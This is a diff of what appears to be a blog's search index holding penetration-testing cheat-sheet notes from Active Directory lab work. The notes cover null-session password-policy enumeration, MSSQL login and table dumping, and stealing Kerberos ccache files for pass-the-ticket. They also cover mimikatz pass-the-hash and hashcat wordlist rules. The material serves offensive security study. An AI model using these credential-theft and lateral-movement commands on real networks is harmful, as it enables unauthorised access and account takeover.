-  </entry>
-  <entry>
-    <title>Enumerating &amp; Retrieving Password Policies</title>
-    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
-    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
-
-<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Enumerating &amp; Retrieving Password Policies</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
       </tags>
   </entry>
   <entry>
@@ -737,6 +737,60 @@
         <tag>ldapsearch</tag>
         <tag>enum4linux-ng</tag>
         <tag>windapsearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -812,60 +866,6 @@
         <tag>MSSQL-Linked-Server</tag>
         <tag>MSSQL-Impersonate-User</tag>
         <tag>Capture-MSSQL-Service-Hash</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
-        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -991,6 +991,38 @@
         <tag>klist</tag>
         <tag>kinit</tag>
         <tag>KeyTabExtract</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PTT : Abusing KeyTab ccache</title>
+    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
+    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
+<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
+
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab Ccache Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>ccache</tag>
       </tags>
   </entry>
   <entry>
@@ -1242,38 +1274,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PTT : Abusing KeyTab ccache</title>
-    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
-    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
-<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
-
-<p>Example</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
-
-<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Ticket (Ptt)</category>
-        <category>KeyTab Ccache Abuse</category>
-      </categories>
-      <tags>
-        <tag>klist</tag>
-        <tag>ccache</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows Pass the Hash (PtH)</title>
     <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
     <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
@@ -1300,57 +1300,6 @@
       <tags>
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Writing Custom Wordlists and Rules</title>
-    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
-    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
-
-<p>Example :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
-<ul>
-<li>Depth to spider (<code>-d</code>)</li>
-<li>The minimum length of the word (<code>-m</code>)</li>
-<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
-<li>The file where we want to store the results (<code>-w</code>)</li>
-</ul>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
-<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
-
-<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
-<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
-</blockquote>
